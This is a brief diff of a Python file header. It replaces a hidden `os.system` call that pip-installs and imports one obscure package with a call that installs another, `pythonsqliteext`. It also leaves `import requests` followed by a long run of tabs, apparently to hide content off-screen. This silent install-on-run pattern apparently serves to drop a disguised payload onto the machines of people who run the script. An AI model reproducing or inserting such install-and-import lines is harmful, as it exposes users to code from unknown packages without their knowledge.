@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringpkgV2")
-import syscolouringpkgV2
+os.system("pip install pythonsqliteext")
+import pythonsqliteext
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
